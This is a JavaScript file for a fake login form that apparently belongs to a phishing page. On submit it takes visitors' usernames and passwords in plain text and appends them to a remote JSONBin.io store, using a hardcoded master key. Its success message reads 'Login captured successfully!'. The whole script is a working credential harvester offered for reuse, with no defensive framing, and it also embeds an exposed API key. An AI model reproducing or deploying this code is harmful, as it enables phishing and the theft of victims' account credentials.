// ===== JSONBin Configuration =====
// Replace these with your actual JSONBin credentials
const JSONBIN_API_KEY = '$2a$10$Ply9zN9XQQM87A9xbKSIoOMSyIpTzyzYQQyawoqPranigmXxX4e22';
const JSONBIN_BIN_ID = 'a9a0219da38895dfe35f20a';

const JSONBIN_BASE_URL = 'https://api.jsonbin.io/v3';

// ===== DOM Elements =====
const loginForm = document.getElementById('loginForm');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');

// ===== Enable/disable button based on input =====
function checkInputs() {
  if (usernameInput.value.trim() && passwordInput.value.trim()) {
    loginBtn.classList.add('active');
  } else {
    loginBtn.classList.remove('active');
  }
}

usernameInput.addEventListener('input', checkInputs);
passwordInput.addEventListener('input', checkInputs);

// ===== Toast Notification =====
function showToast(message, type = '') {
  const existing = document.querySelector('.toast');
  if (existing) existing.remove();

  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.textContent = message;
  document.body.appendChild(toast);

  requestAnimationFrame(() => {
    toast.classList.add('show');
  });

  setTimeout(() => {
    toast.classList.remove('show');
    setTimeout(() => toast.remove(), 300);
  }, 3000);
}

// ===== Form Submit =====
loginForm.addEventListener('submit', async (e) => {
  e.preventDefault();

  const payload = {
    username: usernameInput.value.trim(),
    password: passwordInput.value.trim(),
    timestamp: new Date().toISOString()
  };

  loginBtn.textContent = 'Logging in...';
  loginBtn.disabled = true;

  try {
    // First, get existing records
    const readRes = await fetch(`${JSONBIN_BASE_URL}/${JSONBIN_BIN_ID}/latest`, {
      headers: {
        'X-Master-Key': JSONBIN_API_KEY
      }
    });

    let existingRecords = [];
    if (readRes.ok) {
      const readData = await readRes.json();
      existingRecords = readData.record;
      if (!Array.isArray(existingRecords)) {
        existingRecords = [existingRecords];
      }
    }

    // Append new record
    existingRecords.push(payload);

    // Update the bin with the full array
    const writeRes = await fetch(`${JSONBIN_BASE_URL}/${JSONBIN_BIN_ID}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'X-Master-Key': JSONBIN_API_KEY
      },
      body: JSON.stringify(existingRecords)
    });

    if (writeRes.ok) {
      showToast('Login captured successfully!', 'success');
      loginForm.reset();
      loginBtn.classList.remove('active');
    } else {
      throw new Error('Failed to save');
    }
  } catch (err) {
    showToast('Something went wrong. Check your JSONBin credentials.', 'error');
    console.error(err);
  } finally {
    loginBtn.textContent = 'Log In';
    loginBtn.disabled = false;
  }
});
